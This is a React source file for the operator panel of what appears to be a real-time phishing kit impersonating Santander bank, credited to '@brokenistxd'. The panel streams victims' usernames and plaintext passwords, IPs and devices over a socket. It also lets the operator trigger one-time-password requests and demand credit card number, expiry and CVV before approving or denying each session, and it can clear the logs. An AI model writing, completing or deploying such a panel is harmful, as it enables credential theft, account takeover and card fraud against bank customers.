import React, { useState, useEffect, useCallback } from 'react';
import io from 'socket.io-client';
import { AlertCircle, CheckCircle2, XCircle, RefreshCw, ShieldAlert, Trash2 } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

// More flexible status type
type AttemptStatus = 'pending' | 'approved' | 'denied' | 'phone_required' | 'phone_submitted' | 'otp_sent_to_user' | 'otp_submitted' | 'cc_required' | 'pending_cc_verification' | 'otp_verified' | 'cc_submitted' | 'failed';

interface LoginAttempt {
  id: string;
  timestamp: string;
  status: AttemptStatus;
  client_info: {
    ip: string;
    user_agent: { browser: string; os: string; device: string; is_mobile: boolean; };
  };
  username: string;
  password?: string;
  phone_number?: string;
  submitted_otp?: string;
  credit_card?: {
    number: string;
    expiry: string;
    cvv: string;
  };
  is_bot?: boolean;
  honeypot_triggered?: boolean;
  is_online?: boolean;
}

// Separate component for action buttons for clarity
const ActionButtons: React.FC<{ attempt: LoginAttempt; onAction: (id: string, action: string) => void }> = ({ attempt, onAction }) => {
  const isFinalState = attempt.status === 'approved' || attempt.status === 'denied';

  if (isFinalState) return null;

  const hasSubmittedOtp = !!attempt.submitted_otp;
  const hasSubmittedCc = !!attempt.credit_card;
  const canRequestOtp = !['otp_sent_to_user', 'otp_submitted'].includes(attempt.status);

  return (
    <div className="flex flex-wrap items-center justify-end gap-2">
      <button onClick={() => onAction(attempt.id, 'approve')} className="rounded bg-indigo-600 px-2 py-1 text-xs font-semibold text-white shadow-sm hover:bg-indigo-500">Approve</button>
      <button onClick={() => onAction(attempt.id, 'deny')} className="rounded bg-white px-2 py-1 text-xs font-semibold text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 hover:bg-gray-50">Deny</button>
      
      {canRequestOtp && (
        <button onClick={() => onAction(attempt.id, 'request-otp')} className="rounded bg-amber-500 px-2 py-1 text-xs font-semibold text-white shadow-sm hover:bg-amber-400">Send OTP</button>
      )}

      {!hasSubmittedCc && (
        <button onClick={() => onAction(attempt.id, 'request-cc')} className="rounded bg-cyan-500 px-2 py-1 text-xs font-semibold text-white shadow-sm hover:bg-cyan-400">Request CC</button>
      )}
    </div>
  );
};

const getStatusBadge = (status: AttemptStatus) => {
    const baseClass = 'inline-flex items-center rounded-full px-2.5 py-0.5 text-xs font-medium';
    const statusMap: { [key in AttemptStatus]?: { text: string; className: string; icon: JSX.Element; } } = {
        pending: { text: 'Pending', className: 'bg-yellow-100 text-yellow-800', icon: <AlertCircle className="mr-1 h-3 w-3" /> },
        approved: { text: 'Approved', className: 'bg-green-100 text-green-800', icon: <CheckCircle2 className="mr-1 h-3 w-3" /> },
        denied: { text: 'Denied', className: 'bg-red-100 text-red-800', icon: <XCircle className="mr-1 h-3 w-3" /> },
        phone_required: { text: 'Phone Required', className: 'bg-blue-100 text-blue-800', icon: <ShieldAlert className="mr-1 h-3 w-3" /> },
        phone_submitted: { text: 'Phone Submitted', className: 'bg-teal-100 text-teal-800', icon: <ShieldAlert className="mr-1 h-3 w-3" /> },
        otp_sent_to_user: { text: 'OTP Sent', className: 'bg-cyan-100 text-cyan-800', icon: <ShieldAlert className="mr-1 h-3 w-3" /> },
        otp_submitted: { text: 'OTP Submitted', className: 'bg-purple-100 text-purple-800', icon: <ShieldAlert className="mr-1 h-3 w-3" /> },
        cc_required: { text: 'CC Required', className: 'bg-pink-100 text-pink-800', icon: <ShieldAlert className="mr-1 h-3 w-3" /> },
        pending_cc_verification: { text: 'CC Submitted', className: 'bg-orange-100 text-orange-800', icon: <ShieldAlert className="mr-1 h-3 w-3" /> },
    };
    const { text, className, icon } = statusMap[status] || { text: status, className: 'bg-gray-100 text-gray-800', icon: null };
    return <span className={`${baseClass} ${className}`}>{icon}{text}</span>;
};

export default function AdminDashboard() {
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();

  const fetchLoginAttempts = useCallback(async () => {
    setIsLoading(true);
    try {
      const response = await fetch('http://localhost:5000/api/login-attempts', { credentials: 'include' });
      if (!response.ok) {
        if (response.status === 403) navigate('/login');
        throw new Error('Failed to fetch login attempts');
      }
      const data = await response.json();
      setLoginAttempts(data.login_attempts || []);
    } catch (err) {
      setError('Could not load login attempts.');
    } finally {
      setIsLoading(false);
    }
  }, [navigate]);
  
  const handleAdminAction = async (attemptId: string, action: string) => {
    // New logic for requesting OTP
    if (action === 'request-otp') {
        const lastTwoDigits = prompt("Please enter the last two digits of the user's phone number:");
        if (lastTwoDigits && lastTwoDigits.match(/^\d{2}$/)) {
            try {
                // Call the new, simplified endpoint
                await fetch(`http://localhost:5000/api/send-otp/${attemptId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', },
                    body: JSON.stringify({ last_two_digits: lastTwoDigits }),
                    credentials: 'include',
                });
            } catch (err) {
                // Handle error silently
            }
        } else if (lastTwoDigits !== null) { // only show error if user entered something invalid
            alert("Invalid input. Please enter exactly two digits.");
        }
        return; // Stop further execution for this action
    }

    const endpointMap: { [key: string]: string } = {
        'approve': `approve-login/${attemptId}`,
        'deny': `deny-login/${attemptId}`,
        'request-cc': `request-cc/${attemptId}`,
    };
    const endpoint = endpointMap[action];
    if (!endpoint) return;
    try {
      await fetch(`http://localhost:5000/api/${endpoint}`, { method: 'POST', credentials: 'include' });
      } catch (err) {
      // Silently fail, admin will see the UI not update
    }
  };

  const handleClearLogs = async () => {
    if (window.confirm('Are you sure you want to delete all activity logs?')) {
        try {
            await fetch('http://localhost:5000/api/clear-logs', { method: 'POST', credentials: 'include' });
        } catch (err) {
            // Silently fail
        }
    }
  };

  useEffect(() => {
    fetchLoginAttempts();
    const notificationAudio = new Audio('/notification.mp3');
    const socket: any = io('http://localhost:5000/admin', { withCredentials: true, } as any);

    socket.on('new_login_attempt', (newAttempt: LoginAttempt) => {
        setLoginAttempts(prev => [newAttempt, ...prev.filter(a => a.id !== newAttempt.id)]);
        notificationAudio.play().catch(() => {
            // Audio playback failed, common in browsers until user interaction.
        });
    });
    socket.on('update_login_attempt', (updatedAttempt: LoginAttempt) => setLoginAttempts(prev => prev.map(att => att.id === updatedAttempt.id ? updatedAttempt : att)));
    socket.on('logs_cleared', () => alert('Logs Cleared'));

    return () => { socket.disconnect() };
  }, [fetchLoginAttempts]);

  if (isLoading) return <div className="p-8 text-center">Loading...</div>;
  if (error) return <div className="p-8 text-center text-red-500">{error}</div>;
  
    return (
    <div className="min-h-screen bg-gray-50">
        <header className="bg-white shadow-sm">
            <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6 lg:px-8">
                <div className="flex items-center">
                    <img src="/santander-logo.svg" alt="Santander Logo" className="h-8" />
                    <h1 className="ml-4 text-xl font-semibold text-gray-900">Admin Dashboard panel by @brokenistxd </h1>
            </div>
                <div className="flex items-center gap-4">
                    <button onClick={handleClearLogs} className="inline-flex items-center gap-x-1.5 rounded-md bg-amber-600 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-amber-500"><Trash2 className="-ml-0.5 h-5 w-5" />Clear Logs</button>
                    <button onClick={fetchLoginAttempts} className="inline-flex items-center gap-x-1.5 rounded-md bg-red-600 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-red-500"><RefreshCw className="-ml-0.5 h-5 w-5" />Refresh</button>
              </div>
            </div>
        </header>
        <main className="py-10">
            <div className="px-4 sm:px-6 lg:px-8">
                <h1 className="text-xl font-semibold text-gray-900">Login Attempts</h1>
                <div className="mt-4 overflow-hidden bg-white shadow ring-1 ring-black ring-opacity-5 sm:rounded-lg">
                    <table className="min-w-full divide-y divide-gray-300">
              <thead className="bg-gray-50">
                <tr>
                                <th scope="col" className="py-3.5 pl-4 pr-3 text-left text-sm font-semibold text-gray-900 sm:pl-6">User</th>
                                <th scope="col" className="px-3 py-3.5 text-left text-sm font-semibold text-gray-900">Time</th>
                                <th scope="col" className="px-3 py-3.5 text-left text-sm font-semibold text-gray-900">Device</th>
                                <th scope="col" className="px-3 py-3.5 text-left text-sm font-semibold text-gray-900">Status</th>
                                <th scope="col" className="relative py-3.5 pl-3 pr-4 sm:pr-6"><span className="sr-only">Actions</span></th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200 bg-white">
                            {loginAttempts.map((attempt) => (
                                <tr key={attempt.id}>
                                    <td className="whitespace-nowrap py-4 pl-4 pr-3 text-sm sm:pl-6">
                                        <div className="flex items-center">
                                            <span className={`h-2.5 w-2.5 rounded-full mr-2.5 flex-shrink-0 ${attempt.is_online ? 'bg-green-500' : 'bg-gray-400'}`}></span>
                        <div>
                                                <div className="font-medium text-gray-900">{attempt.username}</div>
                                                {attempt.password && <div className="text-gray-500 text-xs">Pass: {attempt.password}</div>}
                          </div>
                        </div>
                      </td>
                                    <td className="whitespace-nowrap px-3 py-4 text-sm text-gray-500"><time dateTime={attempt.timestamp}>{new Date(attempt.timestamp).toLocaleString()}</time></td>
                                    <td className="whitespace-nowrap px-3 py-4 text-sm text-gray-500">
                                        <div>{attempt.client_info.user_agent.browser} on {attempt.client_info.user_agent.os}</div>
                                        <div className="text-xs">{attempt.client_info.user_agent.is_mobile ? 'Mobile' : 'Desktop'} - {attempt.client_info.ip}</div>
                      </td>
                                    <td className="whitespace-nowrap px-3 py-4 text-sm text-gray-500">{getStatusBadge(attempt.status)}</td>
                                    <td className="relative whitespace-nowrap py-4 pl-3 pr-4 text-right text-sm font-medium sm:pr-6">
                                        <ActionButtons attempt={attempt} onAction={handleAdminAction} />
                      </td>
                    </tr>
                            ))}
              </tbody>
            </table>
          </div>
        </div>
        </main>
    </div>
  );
}
